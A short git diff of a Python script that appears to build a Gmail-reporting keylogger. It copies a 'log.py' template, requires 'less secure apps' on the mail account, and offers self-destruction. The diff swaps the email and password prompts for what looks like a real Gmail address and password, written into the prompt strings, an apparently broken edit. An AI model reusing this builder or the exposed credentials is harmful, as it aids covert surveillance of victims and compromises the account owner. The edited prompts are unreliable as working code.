@@ -18,8 +18,8 @@ print("""
 print ('\n {0}WARNING: Enable access to less secure apps on your email account.{2}  \n -> * ONLY WORK WITH GMAIL * :\n {1}https://www.google.com/settings/security/lesssecureapps{2}'.format(RED, GREEN, END))
 print('\n')
 os.system('copy Template\log.py .\log.py >nul')
-email = input(BLUE + 'Enter your email: ' + END)
-passd =  getpass(BLUE + 'Enter your password: ' + END)
+email = input(BLUE + 'ardalg689@gmail.com: ' + END)
+passd =  getpass(BLUE + 'arda1shere0: ' + END)
 
 
 chk = input(BLUE + "\nDo you want to add self-destruction [y/n] \n" + header + END)
